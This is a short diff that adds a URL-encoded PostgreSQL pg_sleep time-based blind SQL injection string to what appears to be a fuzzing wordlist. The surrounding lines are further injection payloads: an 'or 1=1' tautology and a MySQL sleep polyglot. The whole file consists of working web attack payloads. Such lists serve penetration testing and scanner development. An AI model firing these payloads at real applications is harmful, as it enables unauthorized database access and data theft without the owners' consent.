@@ -1,3 +1,4 @@
+''%7C%7C(select%201%20from%20(select%20pg_sleep(6))x)%7C%7C''
 )%20or%20('x'='x
 %20or%201=1
 (select(0)from(select(sleep(13)))v)/*'+(select(0)from(select(sleep(13)))v)+'\"+(select(0)from(select(sleep(13)))v)+\"*/
